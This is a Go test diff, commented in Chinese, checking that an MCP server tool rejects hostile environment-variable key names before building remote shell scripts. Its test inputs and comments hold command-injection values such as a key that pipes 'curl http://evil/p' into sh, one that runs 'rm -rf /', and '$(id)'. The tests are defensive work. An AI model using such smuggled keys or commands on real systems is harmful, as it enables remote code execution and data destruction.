@@ -173,6 +173,118 @@ func TestBuildRemoteStdioProbeCommandEncodesScript(t *testing.T) {
 	}
 }
 
+// env 的**键名**必须挡住，且不可能靠加引号解决：`env 'a b'=v` 本身非法。
+//
+// 这条量的是"注入还能不能构造出来"，而不是"函数返回了错误"。2026-09-29 实测的脚本形态：
+// 键 `x;curl http://evil/p|sh;#` 解出来的远端脚本是
+//
+//	env NORMAL='ok' x;curl http://evil/p|sh;#='1' 'echo'
+//
+// —— `;` 截断后注入命令直接执行，`#` 把残渣注释掉。
+func TestMCPEnvKeyGateBlocksRemoteShellInjection(t *testing.T) {
+	for _, key := range []string{
+		"x;curl http://evil/p|sh;#",
+		"TOKEN=1", // 等于号会把键值拆错位
+		"A B",
+		"1TOKEN",
+		"",
+		"$(id)",
+	} {
+		if err := mcpEnvKeyError(map[string]string{key: "1"}); err == nil {
+			t.Fatalf("键 %q 应当被拒（它能改变远端脚本的结构）", key)
+		}
+	}
+	for _, key := range []string{"TOKEN", "_A", "A1", "HTTPS_PROXY", "NODE_OPTIONS"} {
+		if err := mcpEnvKeyError(map[string]string{key: "1"}); err != nil {
+			t.Fatalf("键 %q 是合法 POSIX 名，不该被拒：%v", key, err)
+		}
+	}
+	if err := mcpEnvKeyError(nil); err != nil {
+		t.Fatalf("没有 env 时不该报错：%v", err)
+	}
+	// 报错必须**点名是哪个键**：只说"环境变量名不合法"，用户拿着几十行配置无从下手。
+	// 带空格的键要额外断言：它证明报错走的是"列出原始键名"而不是自己拼接过的形态。
+	err := mcpEnvKeyError(map[string]string{"x;rm -rf /": "1", "bad key": "2"})
+	if err == nil {
+		t.Fatal("含非法键时应当返回错误")
+	}
+	for _, want := range []string{"x;rm -rf /", "bad key", "环境变量名不合法"} {
+		if !strings.Contains(err.Error(), want) {
+			t.Fatalf("错误文案 %q 里缺少 %q", err.Error(), want)
+		}
+	}
+}
+
+// 探针入口的闸门。probeMCPServer 是所有探测路径的**唯一漏斗**（已落库的测试连接与
+// 草稿试连都走它），键名不合法必须在起进程之前就返回可读原因：草稿压根不落库，
+// 老数据也可能带着本次修复之前写进去的非法键。
+func TestProbeMCPServerRejectsHostileEnvKeys(t *testing.T) {
+	s := newTestServer(t)
+	_, err := s.probeMCPServer(context.Background(), mcpProbeRequest{
+		Transport: mcpTransportStdio,
+		Command:   "echo",
+		Env:       map[string]string{"x;curl http://evil/p|sh;#": "1"},
+	})
+	if err == nil || !strings.Contains(err.Error(), "环境变量名不合法") {
+		t.Fatalf("探针应当拒绝非法 env 键并给出可读原因，实际 err=%v", err)
+	}
+}
+
+// 写入路径（创建 / 更新 / 导入）同样要挡：**导入**的 env 键来自第三方配置 JSON，
+// 而用户在界面上只会审阅 command，不会逐字去看环境变量的键名。
+func TestMCPServerInputRejectsHostileEnvKeys(t *testing.T) {
+	base := func() mcpServerInput {
+		return mcpServerInput{
+			Name:         "demo",
+			Transport:    mcpTransportStdio,
+			Command:      "npx",
+			Scope:        mcpScopeGlobal,
+			Environments: []string{"windows"},
+			Agents:       []string{"claude-code"},
+		}
+	}
+	input := base()
+	input.Env = map[string]string{"x;rm -rf /": "1"}
+	if err := input.validate(); err == nil {
+		t.Fatal("含非法 env 键的配置不该通过校验")
+	}
+	// 密文那一组的键名会以同样方式当环境变量名用，一组都不能漏。
+	secret := base()
+	secret.EnvSecrets = map[string]string{"bad key": "plain"}
+	if err := secret.validate(); err == nil {
+		t.Fatal("EnvSecrets 的键名同样要校验")
+	}
+	// 合法配置不能被这道闸门误伤。
+	ok := base()
+	ok.Env = map[string]string{"TOKEN": "1"}
+	ok.EnvSecrets = map[string]string{"API_KEY": "plain"}
+	if err := ok.validate(); err != nil {
+		t.Fatalf("合法配置被误拒：%v", err)
+	}
+}
+
+// buildStoredMaps 是三个写入路径（建 / 改 / **导入**）的唯一咽喉，必须自己挡一道：
+// 导入路径根本不过 validate（它的 validate 跑在填 Env 之前），而它还会把这里的错误
+// 统一压成"凭据无法保存"——所以这一道是"将来新增写入方也不会漏"的兜底。
+func TestBuildStoredMapsRejectsHostileEnvKeys(t *testing.T) {
+	s := newTestServer(t)
+	ctx := context.Background()
+	if _, _, _, err := s.buildStoredMaps(ctx, s.db, map[string]string{"x;rm -rf /": "1"}, nil, nil, nil); err == nil {
+		t.Fatal("非法 env 键必须被 buildStoredMaps 挡住")
+	}
+	if _, _, _, err := s.buildStoredMaps(ctx, s.db, nil, nil, map[string]string{"A B": "plain"}, nil); err == nil {
+		t.Fatal("EnvSecrets 的键名同样要挡")
+	}
+	// 合法键照旧能存（否则这道闸门会变成"谁都存不进去"）。
+	stored, _, _, err := s.buildStoredMaps(ctx, s.db, map[string]string{" TOKEN ": "1"}, nil, nil, nil)
+	if err != nil {
+		t.Fatalf("合法（只是带空白）的键被误拒：%v", err)
+	}
+	if _, ok := stored["TOKEN"]; !ok {
+		t.Fatalf("键名归一化口径与写入不一致：%v", stored)
+	}
+}
+
 func TestPrepareMCPInjectionForCodex(t *testing.T) {
 	s := newTestServer(t)
 	ctx := context.Background()
